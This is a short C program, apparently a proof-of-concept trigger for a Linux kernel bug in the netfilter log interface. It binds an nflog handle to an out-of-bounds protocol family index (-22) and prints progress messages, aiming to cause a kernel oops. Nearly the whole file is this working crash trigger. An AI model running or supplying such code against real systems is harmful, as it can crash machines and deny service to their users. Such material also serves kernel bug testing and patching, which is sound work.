/*
 * Based on code by Miguel Di Ciurcio Filho <miguel.filho@gmail.com>
 */

#include <stdio.h>
#include <netinet/in.h>
#include <libnetfilter_log/libnetfilter_log.h>

int main(int argc, char *argv[])
{
	struct nflog_handle *h;
	h = nflog_open();
	if (!h) {
		printf("[-] Could not open netfilter log.\n");
		return -1;
	}
	printf("[+] Unbinding handle.\n");
	nflog_unbind_pf(h, AF_INET);
	printf("[+] Binding handle to out of bounds index.\n");
	nflog_bind_pf(h, -22); /* expects >= 0? */
	printf("[+] Unbinding handle, now bound to out of bounds index.\n");
	nflog_unbind_pf(h, AF_INET);
	printf("[+] Closing handle.\n");
	nflog_close(h);
	printf("[-] Did not trigger oops.\n");
	return 0;
}
